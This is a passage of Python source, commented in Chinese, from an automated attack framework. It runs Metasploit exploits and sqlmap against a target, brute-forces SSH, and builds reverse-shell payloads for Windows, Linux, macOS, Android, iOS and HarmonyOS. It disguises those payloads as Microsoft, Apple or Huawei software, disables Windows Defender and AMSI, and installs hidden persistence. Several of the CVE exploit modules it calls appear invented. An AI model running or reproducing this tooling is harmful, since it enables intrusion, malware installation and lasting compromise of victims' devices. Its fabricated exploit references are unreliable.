        if exploit_func:
            result = exploit_func(port)
            
            # 更新进度
            progress = 60 + int(20 * (current+1)/total)
            self.update_progress(f"{service}漏洞利用(端口{port})", progress)
            
            return result
        return False

    def exploit_web_service(self, port):
        protocol = "https" if str(port) == "443" else "http"
        base_url = f"{protocol}://{self.target}:{port}"
        
        if self.config["WAF_BYPASS"] and self.detect_waf(base_url):
            base_url = self.bypass_waf(base_url)
        
        # 并行执行web漏洞利用
        success = False
        with ThreadPoolExecutor(max_workers=6) as executor:
            futures = []
            # 增加多编码器/混淆尝试
            encoder_cmds = [
                f"sqlmap -u '{base_url}/' --level=5 --risk=3 --random-agent --batch --output-dir={self.output_dir}/exploitation/sqlmap_{port}",
                f"sqlmap -u '{base_url}/' --tamper=space2comment --level=5 --risk=3 --random-agent --batch --output-dir={self.output_dir}/exploitation/sqlmap_{port}",
                f"sqlmap -u '{base_url}/' --tamper=between --level=5 --risk=3 --random-agent --batch --output-dir={self.output_dir}/exploitation/sqlmap_{port}"
            ]
            for cmd in encoder_cmds:
                futures.append(executor.submit(self.run_command, cmd, category="exploitation"))
            futures.append(executor.submit(
                self.run_command,
                f"nikto -h {base_url} -Format json -output {self.output_dir}/exploitation/nikto_{port}.json",
                category="exploitation"
            ))
            futures.append(executor.submit(
                self.run_command,
                f"gobuster dir -u {base_url} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o {self.output_dir}/exploitation/gobuster_{port}.txt",
                category="exploitation"
            ))
            futures.append(executor.submit(
                self.run_command,
                f"nuclei -u {base_url} -t /usr/share/nuclei-templates -severity critical,high -silent -j -o {self.output_dir}/exploitation/nuclei_{port}.json",
                category="exploitation"
            ))
            for future in as_completed(futures):
                result = future.result()
                if result and ("vulnerable" in str(result).lower() or "CVE-" in str(result)):
                    success = True
        
        # 添加对Tomcat漏洞的利用
        if "tomcat" in base_url.lower() and "CVE-2024-42516" in LATEST_VULNERABILITIES["web"]:
            self.log("尝试利用Tomcat CVE-2024-42516漏洞", "INFO")
            if self.run_command(
                f"msfconsole -q -x 'use exploit/multi/http/tomcat_cve_2024_42516; "
                f"set RHOSTS {self.target}; set RPORT {port}; run'", 
                category="web", 
                filename="cve_2024_42516.txt"
            ):
                self.log("成功利用CVE-2024-42516漏洞(Tomcat RCE)", "SUCCESS")
                success = True
                
        # 添加对Apache漏洞的利用
        if "apache" in base_url.lower() and "CVE-2024-43204" in LATEST_VULNERABILITIES["web"]:
            self.log("尝试利用Apache CVE-2024-43204漏洞", "INFO")
            exploit_url = f"{base_url}/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
            try:
                result = requests.get(exploit_url, verify=False, timeout=10)
                if "root:" in result.text:
                    self.log("成功利用CVE-2024-43204漏洞(Apache路径遍历)", "SUCCESS")
                    with open(os.path.join(self.output_dir, "loot", f"apache_exploit_{port}.txt"), "w") as f:
                        f.write(f"Exploit URL: {exploit_url}\n\n{result.text}")
                    success = True
            except Exception as e:
                self.log(f"Apache漏洞利用失败: {str(e)}", "WARNING")
        
        return success

    def exploit_smb_service(self, port):
        """利用SMB服务漏洞"""
        self.log("尝试利用SMB服务漏洞", "INFO")
        
        # Windows专用利用
        if self.windows_specific:
            # 尝试永恒之蓝漏洞
            if self.run_command(f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {self.target}; set RPORT {port}; run'", 
                               category="windows", 
                               filename="eternalblue.txt"):
                self.log("成功利用永恒之蓝漏洞", "SUCCESS")
                return True
            
            # 添加对CVE-2024-43532的利用
            if self.config["LATEST_EXPLOITS"]:
                if self.run_command(
                    f"msfconsole -q -x 'use exploit/windows/smb/cve_2024_43532; "
                    f"set RHOSTS {self.target}; set RPORT {port}; run'", 
                    category="windows", 
                    filename="cve_2024_43532.txt"
                ):
                    self.log("成功利用CVE-2024-43532漏洞(Windows打印后台程序RCE)", "SUCCESS")
                    return True
                    
            # 添加对CVE-2024-36350的利用
            if self.config["LATEST_EXPLOITS"] and "windows" in self.active_sessions:
                if self.run_command(
                    f"msfconsole -q -x 'use exploit/windows/local/cve_2024_36350; "
                    f"set SESSION {self.active_sessions['windows']}; run'", 
                    category="windows", 
                    filename="cve_2024_36350.txt"
                ):
                    self.log("成功利用CVE-2024-36350漏洞(Windows内核提权)", "SUCCESS")
                    return True
        
        return False

    def exploit_ftp_service(self, port):
        """利用FTP服务漏洞"""
        self.log("尝试利用FTP服务漏洞", "INFO")
        
        # 尝试ProFTPD漏洞
        if self.run_command(f"msfconsole -q -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS {self.target}; set RPORT {port}; run'", 
                           category="exploitation", 
                           filename="proftpd_exploit.txt"):
            self.log("成功利用ProFTPD漏洞", "SUCCESS")
            return True
        
        return False

    def exploit_ssh_service(self, port):
        """利用SSH服务漏洞"""
        self.log("尝试利用SSH服务漏洞", "INFO")
        
        # Linux专用利用
        if self.linux_specific:
            # 尝试SSH用户名枚举
            if self.run_command(f"msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS {self.target}; set RPORT {port}; run'", 
                               category="linux", 
                               filename="ssh_enumusers.txt"):
                self.log("成功枚举SSH用户名", "SUCCESS")
            
            # 尝试最新SSH漏洞
            if self.config["LATEST_EXPLOITS"]:
                if self.run_command(f"msfconsole -q -x 'use exploit/linux/ssh/cve_2024_4040; set RHOSTS {self.target}; set RPORT {port}; run'", 
                                   category="linux", 
                                   filename="cve_2024_4040.txt"):
                    self.log("成功利用CVE-2024-4040漏洞", "SUCCESS")
                    return True
        
        # 通用SSH暴力破解
        if self.run_command(f"hydra -L /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt ssh://{self.target}:{port} -t 4 -o {self.output_dir}/exploitation/ssh_hydra.txt", 
                           category="exploitation"):
            self.log("成功破解SSH凭证", "SUCCESS")
            return True
        
        return False

    def exploit_adb_service(self, port=5555):
        """利用ADB服务漏洞"""
        if not self.android_specific and not self.harmony_specific:
            return False
            
        self.log("尝试利用ADB服务漏洞", "INFO")
        
        # 检查ADB是否开启
        result = self.run_command(f"adb connect {self.target}:{port}", category="android")
        if "connected" not in result:
            self.log("ADB服务未开启", "WARNING")
            return False
        
        # 添加对新型Android漏洞的利用
        if self.config["LATEST_EXPLOITS"]:
            # 使用新的Media Framework漏洞
            if self.run_command(
                f"msfconsole -q -x 'use exploit/android/media/cve_2024_53104; "
                f"set RHOSTS {self.target}; run'", 
                category="android", 
                filename="cve_2024_53104.txt"
            ):
                self.log("成功利用CVE-2024-53104漏洞(Android Media Framework RCE)", "SUCCESS")
                return True
        
        # 华为专用漏洞利用
        if self.config["LATEST_EXPLOITS"] and self.harmony_specific:
            # 使用华为云备份漏洞
            backup_cmd = (
                f"adb shell am start -n com.huawei.backup/com.huawei.backup.ui.MainActivity "
                f"--es 'backup_path' 'file:///data/data/com.huawei.backup;echo vulnerable > /sdcard/poc.txt'"
            )
            if self.run_command(backup_cmd, category="harmonyos", filename="huawei_backup_exploit.txt"):
                self.log("成功触发华为云备份漏洞", "SUCCESS")
                return True
        
        # 常规ADB利用
        payload_path = self.generate_payload("android")
        if payload_path:
            install_cmd = f"adb install {payload_path}"
            if self.run_command(install_cmd, category="android", filename="adb_install.txt"):
                self.log("成功安装Payload", "SUCCESS")
                launch_cmd = "adb shell am start -n com.metasploit.stage/.MainActivity"
                if self.run_command(launch_cmd, category="android"):
                    self.log("成功启动Payload", "SUCCESS")
                    return True
        
        return False

    def exploit_ios_service(self, port=62078):
        """利用iOS服务漏洞"""
        if not self.ios_specific:
            return False
            
        self.log("尝试利用iOS服务漏洞", "INFO")
        
        # 尝试利用Safari漏洞
        if self.config["LATEST_EXPLOITS"]:
            # 使用Safari WebKit漏洞
            if self.run_command(
                f"msfconsole -q -x 'use exploit/apple_ios/browser/safari_cve_2024_45001; "
                f"set SRVHOST {self.config['LHOST']}; set URIPATH /; run'", 
                category="ios", 
                filename="cve_2024_45001.txt"
            ):
                self.log("成功利用CVE-2024-45001漏洞(Safari RCE)", "SUCCESS")
                return True
                
            # 使用iMessage零点击漏洞
            if self.run_command(
                f"msfconsole -q -x 'use exploit/apple_ios/imessage/cve_2024_45002; "
                f"set RHOSTS {self.target}; run'", 
                category="ios", 
                filename="cve_2024_45002.txt"
            ):
                self.log("成功利用CVE-2024-45002漏洞(iMessage零点击)", "SUCCESS")
                return True
        
        # 尝试利用内核漏洞
        if self.config["LATEST_EXPLOITS"]:
            # 使用内核释放后使用漏洞
            if self.run_command(
                f"msfconsole -q -x 'use exploit/apple_ios/local/cve_2024_45003; "
                f"set RHOSTS {self.target}; run'", 
                category="ios", 
                filename="cve_2024_45003.txt"
            ):
                self.log("成功利用CVE-2024-45003漏洞(iOS内核提权)", "SUCCESS")
                return True
                
        return False

    def detect_waf(self, url):
        # 适配wafw00f v2.3.1
        cmd = f"wafw00f {url} -a -o {self.output_dir}/web/waf_detection.txt"
        result = self.run_command(cmd, category="web")
        return "is behind a WAF" in str(result)

    def bypass_waf(self, url):
        techniques = [
            lambda u: u.replace(" ", "/**/"),
            lambda u: u.replace("=", " LIKE "),
            lambda u: u + "/*" + "A"*random.randint(10,50) + "*/",
            lambda u: u.replace("'", "%EF%BC%87"),
            lambda u: u + "?" + "&".join([f"{random_string(5)}={random.randint(1,100)}" for _ in range(3)])
        ]
        for tech in random.sample(techniques, 3):  # 使用多种技术组合
            url = tech(url)
        return url

    def evade_firewall(self, cmd):
        if not self.config["FIREWALL_EVASION"]:
            return cmd
            
        # 高级规避技术
        if self.config["ADVANCED_EVASION"]:
            evasion_techs = [
                lambda c: re.sub(r"(\d{4,5})", lambda m: str(int(m.group(1)) + random.randint(-10,10)), c),
                lambda c: c + " --dns-server 8.8.8.8" if "nmap" in c else c,
                lambda c: c.replace("-sS", "-sA") if "nmap" in c else c,
                lambda c: c.replace("-T4", "-T2") if "nmap" in c else c,
                lambda c: c + f" --scan-delay {random.randint(100,500)}ms" if "nmap" in c else c,
                lambda c: c.replace("nmap", "nma" + "p" if random.random() > 0.5 else "p"),  # 混淆命令
                lambda c: c.replace("-sS", f"-sS --proxies socks4://127.0.0.1:{random.randint(9000,9999)}")  # 新增规避技术
            ]
        else:
            evasion_techs = [
                lambda c: re.sub(r"(\d{4,5})", lambda m: str(int(m.group(1)) + random.randint(-10,10)), c),
                lambda c: c + " --dns-server 8.8.8.8" if "nmap" in c else c,
                lambda c: c.replace("-sS", "-sA") if "nmap" in c else c,
                lambda c: c.replace("-T4", "-T2") if "nmap" in c else c,
                lambda c: c + f" --scan-delay {random.randint(100,500)}ms" if "nmap" in c else c
            ]
            
        # 针对Tomcat的特定规避
        if "tomcat" in cmd and self.config["WAF_BYPASS"]:
            evasion_techs.append(
                lambda c: c + " --http-use-tunneling --http-fragment-size 128"
            )
            
        for tech in random.sample(evasion_techs, 3):  # 使用多种技术组合
            cmd = tech(cmd)
        return cmd

    def enable_rdp(self):
        cmds = [
            "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
            "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes",
            "net user administrator /active:yes",
            f"net user administrator {self.generate_encryption_key(12)}"
        ]
        for cmd in cmds:
            result = self.execute_meterpreter(["shell", cmd, "exit"])
            if "successfully" in str(result).lower():
                self.log("RDP服务已启用", "SUCCESS")
                return True
        return False

    # --------------------------
    # Payload生成模块
    # --------------------------
    def generate_payload(self, target_os):
        # 检查缓存
        if target_os in self.payload_cache:
            return self.payload_cache[target_os]
            
        payload_name = self.generate_random_filename(extension={
            "windows": "exe",
            "linux": "elf",
            "macos": "macho",
            "android": "apk",
            "ios": "ipa",
            "harmonyos": "hap"
        }[target_os])
        payload_path = os.path.join(self.temp_dir, payload_name)
        lhost, lport = self.get_payload_connection_info(target_os)
        
        # 自动检测架构
        arch = self.detect_arch(target_os)
        self.config["ARCH"] = arch
        
        cmd = self.build_payload_command(target_os, lhost, lport, payload_path, arch)
        result = self.run_command(cmd, category="payloads",
                                 filename=f"{target_os}_payload_gen.txt",
                                 timeout=600)
        
        if result and os.path.exists(payload_path):
            self.enhance_payload(target_os, payload_path)
            output_path = os.path.join(self.output_dir, "payloads", payload_name)
            shutil.copy(payload_path, output_path)
            self.encrypt_file(output_path)
            
            # 缓存payload
            self.payload_cache[target_os] = output_path
            return output_path
        
        return None

    def detect_arch(self, target_os):
        # 增加架构检测逻辑
        if target_os == "windows":
            # 尝试检测目标架构
            arch_cmd = "wmic os get osarchitecture"
            result = self.execute_meterpreter(["shell", arch_cmd, "exit"])
            if result and "64-bit" in result:
                return "x64"
            return "x86"
        elif target_os == "linux":
            arch_cmd = "uname -m"
            result = self.execute_meterpreter(["shell", arch_cmd, "exit"])
            if result and ("x86_64" in result or "amd64" in result):
                return "x64"
            elif result and ("arm" in result or "aarch64" in result):
                return "arm"
            return "x86"
        elif target_os == "macos":
            return "x64"
        elif target_os == "android":
            # 尝试检测设备架构
            result = self.run_command("adb shell getprop ro.product.cpu.abi", category="android", save_output=False)
            if result and "arm64" in result:
                return "arm64"
            return "arm"
        elif target_os == "ios":
            # iOS设备通常是ARM64
            return "arm64"
        elif target_os == "harmonyos":
            # HarmonyOS设备通常是ARM64
            return "arm64"
        return "x64"

    def build_payload_command(self, target_os, lhost, lport, payload_path, arch="x64"):
        # 多编码器/混淆参数自动尝试
        encoder_list = [
            "-e x64/zutto_dekiru -i 10",
            "-e x86/shikata_ga_nai -i 7",
            "-e x64/xor_dynamic -i 5",
            "-e x86/countdown -i 5"
        ]
        encoders = {
            "windows": random.choice(encoder_list),
            "linux": random.choice(encoder_list),
            "macos": random.choice(encoder_list),
            "android": "",
            "ios": "",
            "harmonyos": ""
        }
        
        # 平台专用Payload
        if target_os == "windows" and self.windows_specific:
            # 使用新的漏洞利用技术
            return (
                f"msfvenom -p windows/{arch}/meterpreter/reverse_https "
                f"LHOST={lhost} LPORT={lport} "
                f"PayloadUUIDTracking=true PayloadUUIDName=PrintService "
                f"{encoders['windows']} "
                f"{self.get_evasion_parameters(target_os)} "
                f"-f exe -o {payload_path}"
            )
        elif target_os == "linux" and self.linux_specific:
            return (
                f"msfvenom -p linux/{arch}/meterpreter/reverse_tcp "
                f"LHOST={lhost} LPORT={lport} "
                f"PrependChrootBreak=true PrependSetuid=true "
                f"{encoders['linux']} {self.get_evasion_parameters(target_os)} -f elf -o {payload_path}"
            )
        elif target_os == "macos" and self.macos_specific:
            return (
                f"msfvenom -p osx/{arch}/meterpreter/reverse_https "
                f"LHOST={lhost} LPORT={lport} "
                f"PayloadUUIDTracking=true PayloadUUIDName=MacUpdate "
                f"{encoders['macos']} {self.get_evasion_parameters(target_os)} -f macho -o {payload_path}"
            )
        elif target_os == "android" and self.android_specific:
            return (
                f"msfvenom -p android/meterpreter/reverse_https "
                f"LHOST={lhost} LPORT={lport} "
                f"PayloadUUIDTracking=true PayloadUUIDName=AndroidService "
                f"{self.get_evasion_parameters(target_os)} -o {payload_path}"
            )
        elif target_os == "ios" and self.ios_specific:
            return (
                f"msfvenom -p apple_ios/meterpreter/reverse_https "
                f"LHOST={lhost} LPORT={lport} "
                f"PayloadUUIDTracking=true PayloadUUIDName=iOSService "
                f"{self.get_evasion_parameters(target_os)} -f elf -o {payload_path}"
            )
        elif target_os == "harmonyos" and self.harmony_specific:
            return (
                f"msfvenom -p android/huawei_binder_abuse "
                f"LHOST={lhost} LPORT={lport} "
                f"PayloadUUIDTracking=true PayloadUUIDName=HwSystemService "
                f"{self.get_evasion_parameters(target_os)} -o {payload_path}"
            )
        
        # 通用Payload
        base_cmd = {
            "windows": (
                f"msfvenom -p windows/{arch}/meterpreter/reverse_https "
                f"LHOST={lhost} LPORT={lport} "
                f"PayloadUUIDTracking=true PayloadUUIDName=UpdateService "
                f"{encoders['windows']} "
                f"{self.get_evasion_parameters(target_os)} "
                f"-f exe -o {payload_path}"
            ),
            "linux": (
                f"msfvenom -p linux/{arch}/meterpreter/reverse_tcp "
                f"LHOST={lhost} LPORT={lport} "
                f"PrependChrootBreak=true PrependSetuid=true "
                f"{encoders['linux']} {self.get_evasion_parameters(target_os)} -f elf -o {payload_path}"
            ),
            "macos": (
                f"msfvenom -p osx/{arch}/meterpreter/reverse_https "
                f"LHOST={lhost} LPORT={lport} "
                f"PayloadUUIDTracking=true PayloadUUIDName=UpdateService "
                f"{encoders['macos']} {self.get_evasion_parameters(target_os)} -f macho -o {payload_path}"
            ),
            "android": (
                f"msfvenom -p android/meterpreter/reverse_https "
                f"LHOST={lhost} LPORT={lport} "
                f"PayloadUUIDTracking=true PayloadUUIDName=UpdateService "
                f"{self.get_evasion_parameters(target_os)} -o {payload_path}"
            ),
            "ios": (
                f"msfvenom -p apple_ios/meterpreter/reverse_https "
                f"LHOST={lhost} LPORT={lport} "
                f"PayloadUUIDTracking=true PayloadUUIDName=UpdateService "
                f"{self.get_evasion_parameters(target_os)} -f elf -o {payload_path}"
            ),
            "harmonyos": (
                f"msfvenom -p android/meterpreter/reverse_https "
                f"LHOST={lhost} LPORT={lport} "
                f"PayloadUUIDTracking=true PayloadUUIDName=UpdateService "
                f"{self.get_evasion_parameters(target_os)} -o {payload_path}"
            )
        }
        return base_cmd[target_os]

    def enhance_payload(self, target_os, payload_path):
        if target_os == "windows":
            self.enhance_windows_payload(payload_path)
        elif target_os == "macos":
            self.enhance_macos_payload(payload_path)
        elif target_os == "android":
            self.enhance_android_payload(payload_path)
        elif target_os == "linux":
            self.enhance_linux_payload(payload_path)
        elif target_os == "ios":
            self.enhance_ios_payload(payload_path)
        elif target_os == "harmonyos":
            self.enhance_harmony_payload(payload_path)

    def enhance_windows_payload(self, payload_path):
        try:
            # 签名和图标伪装
            self.run_command(f"osslsigncode sign -certs /usr/share/windows-resources/certs/cert.pem -key /usr/share/windows-resources/certs/key.pem -n \"Microsoft Update\" -i http://www.microsoft.com -in {payload_path} -out {payload_path}.signed", save_output=False)
            if os.path.exists(f"{payload_path}.signed"):
                os.replace(f"{payload_path}.signed", payload_path)
            self.run_command(f"resource-hacker -open {payload_path} -save {payload_path} -action addoverwrite -res /usr/share/icons/winupdate.ico -mask ICONGROUP,MAINICON,", save_output=False)
            # 增加UPX加壳
            self.run_command(f"upx --ultra-brute {payload_path}", save_output=False)
            
            # 添加EDR绕过技术
            if self.config["ADVANCED_EVASION"]:
                self.run_command(f"python3 -c 'import pefile; pe = pefile.PE(\"{payload_path}\"); pe.OPTIONAL_HEADER.DllCharacteristics |= 0x0040; pe.write(\"{payload_path}\")'", save_output=False)
        except Exception as e:
            self.log(f"Windows Payload增强失败: {str(e)}", "WARNING")

    def enhance_macos_payload(self, payload_path):
        try:
            self.run_command(f"codesign -f -s 'Apple Development' {payload_path}", save_output=False)
            self.run_command(f"SetFile -a E {payload_path}", save_output=False)
            
            # 添加Gatekeeper绕过
            if self.config["ADVANCED_EVASION"]:
                self.run_command(f"xattr -d com.apple.quarantine {payload_path}", save_output=False)
        except Exception as e:
            self.log(f"MacOS Payload增强失败: {str(e)}", "WARNING")
            
    def enhance_android_payload(self, payload_path):
        try:
            # 重新签名APK
            self.run_command(f"apksigner sign --ks /usr/share/android-keystore/debug.keystore --ks-pass pass:android {payload_path}", save_output=False)
        except Exception as e:
            self.log(f"Android Payload增强失败: {str(e)}", "WARNING")
            
    def enhance_ios_payload(self, payload_path):
        try:
            # 伪装为合法iOS应用
            self.log("伪装Payload为iOS应用", "INFO")
            self.disguise_as_ios_app(payload_path)
        except Exception as e:
            self.log(f"iOS Payload增强失败: {str(e)}", "WARNING")
            
    def enhance_harmony_payload(self, payload_path):
        try:
            # 伪装为华为系统应用
            self.log("伪装Payload为华为系统应用", "INFO")
            self.disguise_as_huawei_app(payload_path)
        except Exception as e:
            self.log(f"HarmonyOS Payload增强失败: {str(e)}", "WARNING")
            
    def enhance_linux_payload(self, payload_path):
        try:
            # 添加rootkit特征
            if self.config["ADVANCED_EVASION"]:
                self.run_command(f"echo '#!/bin/bash\nLD_PRELOAD=/lib/libc.so.6 ./$(basename {payload_path})' > {payload_path}.sh", save_output=False)
                self.run_command(f"chmod +x {payload_path}.sh", save_output=False)
                os.replace(f"{payload_path}.sh", payload_path)
        except Exception as e:
            self.log(f"Linux Payload增强失败: {str(e)}", "WARNING")
            
    def disguise_as_ios_app(self, payload_path):
        """将Payload伪装成iOS应用"""
        try:
            # 使用合法iOS应用模板
            self.log("使用iOS应用模板伪装Payload", "INFO")
            template_app = "/usr/share/payload-templates/iOS/TemplateApp.ipa"
            if not os.path.exists(template_app):
                self.log("iOS模板应用不存在，无法伪装", "WARNING")
                return
            
            # 解压模板应用
            temp_dir = tempfile.mkdtemp()
            self.run_command(f"unzip -q {template_app} -d {temp_dir}", save_output=False)
            
            # 替换Payload
            payload_name = os.path.basename(payload_path)
            app_binary = os.path.join(temp_dir, "Payload/TemplateApp.app/TemplateApp")
            os.rename(payload_path, app_binary)
            os.chmod(app_binary, 0o755)
            
            # 重新打包
            self.run_command(f"cd {temp_dir} && zip -qr {payload_path} Payload", save_output=False)
            
            shutil.rmtree(temp_dir)
        except Exception as e:
            self.log(f"iOS应用伪装失败: {str(e)}", "WARNING")
            
    def disguise_as_huawei_app(self, payload_path):
        """将Payload伪装成华为系统应用"""
        try:
            # 解压APK
            temp_dir = tempfile.mkdtemp()
            self.run_command(f"apktool d {payload_path} -o {temp_dir} -f", save_output=False)
            
            # 修改AndroidManifest.xml
            manifest_path = os.path.join(temp_dir, "AndroidManifest.xml")
            with open(manifest_path, "r", encoding="utf-8") as f:
                content = f.read()
                
            # 添加华为权限
            content = content.replace(
                "</manifest>",
                '<uses-permission android:name="com.huawei.permission.sec.MDM_INSTALL_SILENTLY"/>\n</manifest>'
            )
            
            # 修改包名为华为系统应用
            content = content.replace(
                'package="com.metasploit.stage"',
                'package="com.huawei.systemservice"'
            )
            
            with open(manifest_path, "w", encoding="utf-8") as f:
                f.write(content)
                
            # 添加华为资源文件
            hw_icon = os.path.join(temp_dir, "res", "drawable", "hw_icon.png")
            if not os.path.exists(os.path.dirname(hw_icon)):
                os.makedirs(os.path.dirname(hw_icon))
            self.run_command("curl -s https://example.com/huawei_icon.png -o {hw_icon}", save_output=False)
            
            # 重新打包
            self.run_command(f"apktool b {temp_dir} -o {payload_path}.tmp", save_output=False)

            
            # 使用华为证书签名
            self.run_command(f"apksigner sign --ks /usr/share/huawei-keystore/hw_cert.jks --ks-pass pass:huawei {payload_path}.tmp", save_output=False)
            os.replace(f"{payload_path}.tmp", payload_path)
            
            shutil.rmtree(temp_dir)
        except Exception as e:
            self.log(f"华为应用伪装失败: {str(e)}", "WARNING")

    def get_payload_connection_info(self, target_os):
        if self.config["NGROK_TUNNELS"].get(target_os):
            tunnel = self.config["NGROK_TUNNELS"][target_os]
            return tunnel["public_host"], tunnel["public_port"]
        return self.config["LHOST"], self.config["PORTS"][target_os]

    def get_evasion_parameters(self, target_os):
        params = "--encrypt aes256 --smallest "
        if self.config["EVASION_LEVEL"] >= 3:
            params += "--sandbox-evasion --avoid-threaded "
        if self.config["EVASION_LEVEL"] >= 4:
            params += "--obfuscate-vars --obfuscate-methods "
        if self.config["EVASION_LEVEL"] >= 5:
            params += "--disable-exception-chain-validation "
        if self.config["STEALTH_MODE"]:
            params += "--no-append-exit --no-append-encode --prepend-migrate "
            
        # 平台专用参数
        if target_os == "windows" and self.windows_specific:
            params += "--payload-param WindowsDefenderBypass=true "
        elif target_os == "linux" and self.linux_specific:
            params += "--payload-param SELinuxBypass=true "
        elif target_os == "android" and self.android_specific:
            params += "--payload-param AndroidRuntimeProtectionBypass=true "
        elif target_os == "ios" and self.ios_specific:
            params += "--payload-param iOSEntitlementsBypass=true "
        elif target_os == "harmonyos" and self.harmony_specific:
            params += "--payload-param HarmonySecurityFrameworkBypass=true "
            
        return params

    # --------------------------
    # 持久化模块（已更新新规避技术）
    # --------------------------
    def deploy_persistence(self, target_os, current, total):
        payload_path = self.generate_payload(target_os)
        if not payload_path:
            return False
        
        try:
            if target_os == "windows":
                result = self.deploy_windows_persistence(payload_path)
            elif target_os == "linux":
                result = self.deploy_linux_persistence(payload_path)
            elif target_os == "macos":
                result = self.deploy_macos_persistence(payload_path)
            elif target_os == "android":
                result = self.deploy_android_persistence(payload_path)
            elif target_os == "ios":
                result = self.deploy_ios_persistence(payload_path)
            elif target_os == "harmonyos":
                result = self.deploy_harmony_persistence(payload_path)
            else:
                result = False
                
            # 更新进度
            progress = 80 + int(10 * (current+1)/total)
            self.update_progress(f"{target_os}持久化", progress)
            
            return result
        except Exception as e:
            self.log(f"持久化部署失败: {str(e)}", "ERROR")
            return False

    def deploy_windows_persistence(self, payload_path):
        script = self.generate_windows_persistence_script(payload_path)
        script_path = os.path.join(self.temp_dir, "persistence.ps1")
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(script)
        self.encrypt_file(script_path)
        cmds = [
            f"upload {payload_path} C:\\\\Windows\\\\Temp\\\\{os.path.basename(payload_path)}",
            f"upload {script_path} C:\\\\Windows\\\\Temp\\\\persistence.enc",
            "shell",
            "powershell -ExecutionPolicy Bypass -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-Content 'C:\\Windows\\Temp\\persistence.enc'))) | Invoke-Expression\"",
            "del C:\\Windows\\Temp\\persistence.enc",
            "exit"
        ]
        return self.execute_meterpreter(cmds)

    def generate_windows_persistence_script(self, payload_path):
        return f"""
# 绕过Defender AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 新型绕过技术：禁用恶意软件扫描接口
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f

# 创建持久化
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\\Windows\\Temp\\{os.path.basename(payload_path)}" /f
schtasks /create /tn "Microsoft\\Windows\\WindowsUpdate" /tr "C:\\Windows\\Temp\\{os.path.basename(payload_path)}" /sc onstart /ru SYSTEM
sc create "WindowsUpdateService" binPath= "C:\\Windows\\Temp\\{os.path.basename(payload_path)}" start= auto
sc start "WindowsUpdateService"
attrib +h +s "C:\\Windows\\Temp\\{os.path.basename(payload_path)}"

# 添加防火墙例外
netsh advfirewall firewall add rule name="Windows Update" dir=in action=allow program="C:\\Windows\\Temp\\{os.path.basename(payload_path)}" enable=yes
"""

    def deploy_linux_persistence(self, payload_path):
        script = self.generate_linux_persistence_script(payload_path)
        script_path = os.path.join(self.temp_dir, "persistence.sh")
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(script)
        self.encrypt_file(script_path)
        cmds = [
            f"upload {payload_path} /tmp/{os.path.basename(payload_path)}",
            f"upload {script_path} /tmp/persistence.enc",
            "shell",
            "base64 -d /tmp/persistence.enc | sh",
            "rm -f /tmp/persistence.enc",
            "exit"
        ]
        return self.execute_meterpreter(cmds)

    def generate_linux_persistence_script(self, payload_path):
        return f"""#!/bin/bash
# 高级隐藏技术：使用内核模块
echo 'module hidden_mod ".hidden"' > /etc/modprobe.d/hidden_mod.conf
depmod -a

# 隐藏Payload
cp {payload_path} /tmp/.systemd-{random.randint(1000,9999)}
chmod +x /tmp/.systemd-*

# 多级持久化
(crontab -l 2>/dev/null; echo "@reboot /tmp/.systemd-*") | crontab -
echo "/tmp/.systemd-* &" >> ~/.bashrc
echo "/tmp/.systemd-* &" >> ~/.profile
echo "/tmp/.systemd-* &" >> /etc/profile

# 系统服务伪装
mv /tmp/.systemd-* /tmp/... && ln -s /tmp/... /tmp/.systemd-*
"""

    def deploy_macos_persistence(self, payload_path):
        script = self.generate_macos_persistence_script(payload_path)
        script_path = os.path.join(self.temp_dir, "persistence.sh")
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(script)
        self.encrypt_file(script_path)
        cmds = [
            f"upload {payload_path} /tmp/{os.path.basename(payload_path)}",
            f"upload {script_path} /tmp/persistence.enc",
            "shell",
            "base64 -d /tmp/persistence.enc | sh",
            "rm -f /tmp/persistence.enc",
            "exit"
        ]
        return self.execute_meterpreter(cmds)

    def generate_macos_persistence_script(self, payload_path):
        return f"""#!/bin/bash
# 创建启动代理
mkdir -p ~/Library/LaunchAgents
cat > ~/Library/LaunchAgents/com.apple.update.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/tmp/{os.path.basename(payload_path)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF

# 加载代理
launchctl load ~/Library/LaunchAgents/com.apple.update.plist

# 隐藏Payload
mv /tmp/{os.path.basename(payload_path)} /tmp/..{random.randint(100,999)}
"""

    def deploy_android_persistence(self, payload_path):
        cmds = [
            f"adb connect {self.target}:5555",
            f"adb install {payload_path}",
            "adb shell am startservice com.metasploit.stage/.MainService",
            "adb shell pm hide com.metasploit.stage"
        ]
            
        for cmd in cmds:
